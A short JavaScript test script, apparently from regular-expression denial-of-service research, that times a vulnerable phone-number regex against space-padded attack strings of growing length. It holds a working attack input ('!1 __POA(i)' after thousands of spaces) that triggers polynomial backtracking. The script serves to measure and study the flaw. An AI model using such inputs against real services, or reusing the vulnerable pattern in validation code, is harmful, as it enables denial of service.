/* 3421
 * [+]?[\x20]*(?<int>\d+)?[-\x20]*[\(]?(?<area>[2-9]\d{2})[\)\-\x20]*(?<pbx>[0-9]{3})[-\x20]*(?<num>[0-9]{4})
 * POLYNOMIAL
 * nums:3
 * POLYNOMIAL AttackString:""+" "*5000+"!1 __POA(i)"
 */
var REGEX = /[+]?[\x20]*(?<int>\d+)?[-\x20]*[\(]?(?<area>[2-9]\d{2})[\)\-\x20]*(?<pbx>[0-9]{3})[-\x20]*(?<num>[0-9]{4})/
for(var i = 1; i <= 5000000; i++) {
    var time = Date.now();
    var attack_str = '' + ' '.repeat(i*10000) + '!1 __POA(i)'
    REGEX.exec(attack_str)
    // REGEX.test(attack_str);
    // attack_str.search(REGEX)
    // attack_str.match(REGEX)
    var time_cost = Date.now() - time;
    console.log(i * 10000 + ": " + time_cost+" ms")
}